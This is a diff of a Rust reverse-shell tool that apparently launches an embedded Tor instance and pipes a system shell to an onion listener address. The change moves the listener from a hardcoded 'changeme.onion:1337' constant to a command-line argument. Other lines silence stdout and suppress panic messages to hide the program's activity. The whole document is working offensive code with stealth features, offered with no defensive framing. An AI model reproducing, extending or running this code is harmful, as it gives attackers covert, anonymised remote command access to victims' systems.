@@ -18,6 +18,7 @@ gr33tz:
 
 */
 
+use std::env;
 use std::panic;
 use std::process;
 use std::error::Error;
@@ -32,15 +33,17 @@ use libtor::{Tor, TorFlag};
 
 // START CONFIG
 
-// Onion listener address and port
-const ONION_LISTENER: &str = "changeme.onion:1337"; // onionaddress:port
-
 // The proxy port we would be running Tor on. By default this is 9050 on most Tor installs
 const LOCAL_TORPORT: u16 = 6699;
 
 // END CONFIG
 
-fn shell() -> Result<(), Box<dyn Error>> {
+fn shell(listener: &String) -> Result<(), Box<dyn Error>> {
+    // Hook panics, and don't do anything. This is probably not what we should be doing...but it suppresses panic outputs
+    panic::set_hook(Box::new(|_info| { }));
+
+    let listener: &str = &listener;
+
     // suppress all application output (stdout)
     let _print_gag = Gag::stdout().unwrap();
 
@@ -58,7 +61,7 @@ fn shell() -> Result<(), Box<dyn Error>> {
 
     // stream shell over our tor instance with torstream
     let torsock = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)), LOCAL_TORPORT);
-    let torstream = TorStream::connect_with_address(torsock, ONION_LISTENER).expect("Failed to connect").unwrap();
+    let torstream = TorStream::connect_with_address(torsock, listener).expect("Failed to connect").unwrap();
     let fd = torstream.as_raw_fd();
 
     // shell
@@ -74,10 +77,16 @@ fn shell() -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
+
 fn main() {
-    // Hook panics, and don't do anything. This is probably not what we should be doing...but it suppresses panic outputs
-    panic::set_hook(Box::new(|_info| { }));
-    if let Err(_err) = shell() {
-        process::exit(1);
+    let arguments: Vec<String> = env::args().collect();
+    match arguments.len() {
+        2 => {
+            let listener = &arguments[1];
+            if let Err(_err) = shell(listener) {
+                process::exit(1);
+            }
+        },
+        _ => println!("USAGE:\n\t{} changeme.onion:1337\n", &arguments[0])
     }
 }
